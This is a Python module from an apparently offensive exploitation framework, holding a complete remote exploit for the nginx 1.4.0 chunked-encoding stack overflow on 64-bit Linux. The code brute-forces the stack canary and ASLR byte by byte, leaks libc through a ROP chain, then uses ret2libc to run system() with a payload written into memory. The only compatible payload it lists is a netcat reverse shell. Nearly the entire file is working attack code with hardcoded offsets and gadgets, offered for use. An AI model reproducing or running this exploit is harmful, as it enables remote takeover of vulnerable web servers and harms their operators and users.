# --------------------------------------- Loading packages... ---------------------------------------- #
import typing
import socket
import struct

from pytoolcore import style, exception
from core import exploitcore, pwn


# ---------------------------------------------------------------------------------------------------- #


# -------------------------------- Nginx 1.4.0 child process stub ------------------------------------ #

class Nginx140x64(pwn.RemoteProcess):
    REQ: bytes = b"GET / HTTP/1.1\r\n" + \
                 b"Host: pwner.com\r\n" + \
                 b"Connection: Keep-Alive\r\n" + \
                 b"\r\n"
    EVILREQ: bytes = b"GET / HTTP/1.1\r\n" + \
                     b"Host: pwner.com\r\n" + \
                     b"Transfer-Encoding: Chunked\r\n" + \
                     b"Connection: Keep-Alive\r\n" + \
                     b"\r\n" + \
                     b"deadbeefdeadbeeff\r\n"

    def __init__(self, rsockaddr: typing.Tuple[typing.Any, ...]) -> None:
        super(Nginx140x64, self).__init__(rsockaddr)

    def connect(self) -> None:
        super(Nginx140x64, self).connect()
        try:
            self.send(Nginx140x64.REQ)
            res = self.recv(65535)
            if b"200 OK" in res or b"404" in res or b"302" in res:
                self.clear()
            else:
                super(Nginx140x64, self).disconnect()
                raise (exception.CException("Http server not available"))
        except(socket.error, socket.herror, socket.gaierror, socket.timeout) as err:
            super(Nginx140x64, self).disconnect()
            raise (exception.CException(str(err)))

    def ready(self):
        try:
            self.send(Nginx140x64.EVILREQ)
            self.clear()
        except(socket.error, socket.herror, socket.gaierror, socket.timeout) as err:
            super(Nginx140x64, self).disconnect()
            raise (exception.CException(str(err)))


# ---------------------------------------------------------------------------------------------------- #


class Linux64NginxChunkedExploit(exploitcore.Exploit):

    AUTHOR: str = "Danakane"

    EXPLOITREF: str = "linux_x64_nginx_chunked"
    PAYLOADADDR: int = 0x28f000     # .data
    CANARYOFFSET: int = 4104
    RIPOFFSET: int = 40

    RETADDRESSES: typing.List[int] = [
        0x1098d,  # nginx_hash_init+789
        0x3678d,  # nginx_http_get_forwarded_addr+1424
        0x3c9af,  # ngx_http_arg+95
        0x3df8d   # ngx_http_write_filter+1424
    ]

    PLT: typing.Dict[str, int] = {
        "write@plt":  0xd000,   # used read memory
        "memset@plt": 0xd170,   # used to write memory
        "execve@plt": 0xd250,   # address used to calculate libc base address
        "strcmp@plt": 0xd280    # use control indirectly rdx instead of pop rdx ret
    }

    GOT: typing.Dict[str, int] = {
        "execve@got": 0x28ed60
    }

    LIBC: typing.Dict[str, int] = {
        "execve@libc": 0xe4e30,
        "system@libc": 0x4f440
    }

    GADGETS: typing.Dict[str, typing.List[int]] = {
        "pop_rdi_ret": [0xe119, "pop rdi; ret;"],
        "pop_rsi_ret": [0x11ba8, "pop rsi; ret;"],
        "ret": [0xe11a, "ret;"]     # for 16-bytes alignment upon calling system@libc
    }

    def __init__(self):
        compatibleploads: typing.List[str] = ["reverse/linux_netcat"]
        super(Linux64NginxChunkedExploit, self).__init__(
            author=Linux64NginxChunkedExploit.AUTHOR,
            ref=Linux64NginxChunkedExploit.EXPLOITREF,
            compatibleploads=compatibleploads)
        self.__nginx__: Nginx140x64 = None
        self.__canary__: int = 0x0
        self.__nginxbase__: int = 0x0
        self.__libcbase__: int = 0x0
        self.__rop__: pwn.ROP = pwn.ROP()

    def readqword(self, stuff) -> int:
        qword: bytes = b""
        while not len(qword) == 8:
            for byte in [struct.pack("B", x) for x in range(256)]:
                print("0x" + b"\x00".hex() * (8 - len(qword) - 1) + style.Style.red(byte.hex()) +
                      style.Style.green(qword[::-1].hex()), end="\r")
                self.__nginx__.connect()
                self.__nginx__.ready()
                self.__nginx__.send(stuff + qword + byte)
                stillalive: bool = self.__nginx__.alive()
                self.__nginx__.disconnect()
                if stillalive:
                    qword += byte
                    break
                elif byte == b"\xff":
                    raise exception.CException("Failed to bruteforce process memory :(")
        print()
        return struct.unpack("<Q", qword)[0]

    def bruteforcecanary(self) -> None:
        self.__canary__ = self.readqword(b"A" * Linux64NginxChunkedExploit.CANARYOFFSET)

    def readstack(self, depth: int = 6) -> typing.List[int]:
        qwords: typing.List[int] = []
        if not self.__canary__:
            self.bruteforcecanary()
        for i in range(depth):
            qwords.append(self.readqword(b"A" * Linux64NginxChunkedExploit.CANARYOFFSET +
                                         struct.pack("<Q", self.__canary__) +
                                         b"".join([struct.pack("<Q", qword) for qword in qwords])))
        return qwords

    def bruteforceaslr(self)->None:
        print(style.Style.info("Start bruteforcing stack..."))
        qwords: typing.List[int] = self.readstack(depth=6)
        retaddr: int = qwords[len(qwords)-1]
        print(style.Style.success("Found valid code section address to return: " +
                                  Linux64NginxChunkedExploit.int2str(retaddr)))
        found: bool = False
        for offset in Linux64NginxChunkedExploit.RETADDRESSES:
            base: int = retaddr - offset
            print(style.Style.info("Trying to leak libc base address using nginx base address " +
                                   Linux64NginxChunkedExploit.int2str(base)))
            if self.trypwn(base):
                self.__nginxbase__ = base
                print(style.Style.success("nginx base address found: " +
                                          Linux64NginxChunkedExploit.int2str(self.__nginxbase__)))
                print(style.Style.success("libc base address found: " +
                                          Linux64NginxChunkedExploit.int2str(self.__libcbase__)))
                found = True
                break
            else:
                print(style.Style.failure(Linux64NginxChunkedExploit.int2str(base) +
                                          " isn't nginx base address"))
        if not found:
            raise exception.CException("Failed to find nginx base address :(")

    def trypwn(self, base: int, fromfd: int = 20)->bool:    # find nginx base and libc base at the same time
        success: bool = False
        res: bytes = b""
        self.__rop__.clear()
        self.initgadgets(base)
        for fd in range(fromfd, 3, -1):
            self.ropmemread(fd, Linux64NginxChunkedExploit.GOT["execve@got"], base, 2)
            trash: bytes = b"A" * Linux64NginxChunkedExploit.CANARYOFFSET
            junk: bytes = b"A" * Linux64NginxChunkedExploit.RIPOFFSET
            self.__nginx__.connect()
            self.__nginx__.ready()
            self.__nginx__.clear()
            self.__nginx__.send(trash + struct.pack("<Q", self.__canary__) + junk + self.__rop__.chain)
            try:
                while len(res) < 8:
                    res += self.__nginx__.recv(size=8, timeout=5)
                    if not res:     # empty -> connection is dead
                        break
            except (socket.timeout, socket.error):
                pass
            finally:
                self.__nginx__.disconnect()
        if len(res) >= 8:
            self.__libcbase__ = struct.unpack("<Q", res[:8])[0] - Linux64NginxChunkedExploit.LIBC["execve@libc"]
            success = True
        return success

    def initgadgets(self, base: int)->None:
        self.__rop__.clear()
        for gadgetname, [addr, comment] in Linux64NginxChunkedExploit.GADGETS.items():
            self.__rop__.add(gadgetname=gadgetname, gadgetaddr=addr, base=base,
                             architecture=pwn.Architecture.x86_64, gadgetcomments=comment)

    def ropmemread(self, fd: int, addr: int, base: int, times: int=1):    # read x times 5 bytes starting from addr
        # fd is the remote nginx socket file descriptor
        for i in range(times):
            # set rdx at 0x5 -> number of bytes that write@plt will read from memory
            self.__rop__.packgadget("pop_rdi_ret", [Linux64NginxChunkedExploit.PLT["execve@plt"]])
            self.__rop__.packgadget("pop_rsi_ret", [Linux64NginxChunkedExploit.PLT["execve@plt"]])
            self.__rop__.pack(base + Linux64NginxChunkedExploit.PLT["strcmp@plt"])
            # set rdi with fd
            self.__rop__.packgadget("pop_rdi_ret", [fd])
            # set rsi with addr
            self.__rop__.packgadget("pop_rsi_ret", [addr + 0x5*i])
            self.__rop__.pack(base + Linux64NginxChunkedExploit.PLT["write@plt"])

    def ropmemwrite(self, stuff: bytes, addr: int, base: int)->None:   # write stuff + 5 0x00 at addr
        offset: int = 0x0
        for byte in (stuff + b"\x00"):
            # set rdx at 0x5 -> number of bytes that memset@plt will write
            self.__rop__.packgadget("pop_rdi_ret", [Linux64NginxChunkedExploit.PLT["execve@plt"]])
            self.__rop__.packgadget("pop_rsi_ret", [Linux64NginxChunkedExploit.PLT["execve@plt"]])
            self.__rop__.pack(base + Linux64NginxChunkedExploit.PLT["strcmp@plt"])
            # set rdi with the writable memory addr: .data for example
            self.__rop__.packgadget("pop_rdi_ret", [addr + offset])
            # set rsi with the byte to write
            self.__rop__.packgadget("pop_rsi_ret", [byte])
            self.__rop__.pack(base + Linux64NginxChunkedExploit.PLT["memset@plt"])
            offset += 0x1

    def pwn(self)->None:
        self.__rop__.clear()
        self.initgadgets(self.__nginxbase__)
        trash: bytes = b"A"*Linux64NginxChunkedExploit.CANARYOFFSET
        junk: bytes = b"A"*Linux64NginxChunkedExploit.RIPOFFSET
        self.ropmemwrite(self.payloadbin, Linux64NginxChunkedExploit.PAYLOADADDR, self.__nginxbase__)
        self.__rop__.packgadget("pop_rdi_ret", [Linux64NginxChunkedExploit.PAYLOADADDR])
        self.__rop__.packgadget("ret", [])  # fix rsp 16 bytes alignment to prevent system@libc to crash
        self.__rop__.pack(self.__nginxbase__ + Linux64NginxChunkedExploit.LIBC["system@libc"])
        exploitbin: bytes = trash + struct.pack("<Q", self.__canary__) + junk + self.__rop__.chain
        self.__nginx__.connect()
        self.__nginx__.ready()
        self.__nginx__.send(exploitbin)
        self.__nginx__.disconnect()

    def run(self, rsockaddr: typing.Tuple[typing.Any, ...])->None:

        self.__nginx__ = Nginx140x64(rsockaddr)

        """Phase 1: Bruteforcing the canary"""
        print(style.Style.info("Phase 1 - Canary bruteforcing"))
        self.bruteforcecanary()
        print(style.Style.success("Canary found: " + Linux64NginxChunkedExploit.int2str(self.__canary__)))

        """Phase 2: Bruteforcing ASLR"""
        print(style.Style.info("Phase 2 - ASLR bruteforcing "))
        self.bruteforceaslr()
        print(style.Style.success("ASLR bypassed"))

        """Phase 3: Actual pwning by ret2libc"""
        print(style.Style.info("Phase 3 - Pwning with the final exploit"))
        self.pwn()

    @staticmethod
    def qword2str(qword: bytes) -> str:
        return "0x" + qword.hex()

    @staticmethod
    def int2str(qword: int)->str:
        return "0x" + struct.pack(">Q", qword).hex()


blueprint: typing.Callable = Linux64NginxChunkedExploit
name: str = Linux64NginxChunkedExploit.EXPLOITREF
